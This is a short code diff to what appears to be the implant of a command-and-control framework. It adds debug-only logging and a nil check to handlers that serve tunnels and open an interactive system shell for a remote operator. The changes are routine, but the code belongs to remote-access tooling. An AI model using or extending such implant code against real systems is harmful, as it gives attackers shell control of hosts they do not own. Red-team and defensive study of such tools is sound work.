@@ -1,5 +1,3 @@
-// +build windows linux darwin
-
 package handlers
 
 /*
@@ -58,6 +56,9 @@ var (
 
 // GetTunnelHandlers - Returns a map of tunnel handlers
 func GetTunnelHandlers() map[uint32]TunnelHandler {
+	// {{if .Config.Debug}}
+	log.Printf("[tunnel] Tunnel handlers %v", tunnelHandlers)
+	// {{end}}
 	return tunnelHandlers
 }
 
@@ -195,10 +196,19 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 
 	shellPath := shell.GetSystemShellPath(shellReq.Path)
 	systemShell := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
+	if systemShell == nil {
+		// {{if .Config.Debug}}
+		log.Printf("[shell] Failed to get system shell")
+		// {{end}}
+		return
+	}
 	go systemShell.StartAndWait()
 	// Wait for the process to actually spawn
 	for {
 		if systemShell.Command.Process == nil {
+			// {{if .Config.Debug}}
+			log.Printf("[shell] Waiting for process to spawn ...")
+			// {{end}}
 			time.Sleep(time.Second)
 		} else {
 			break
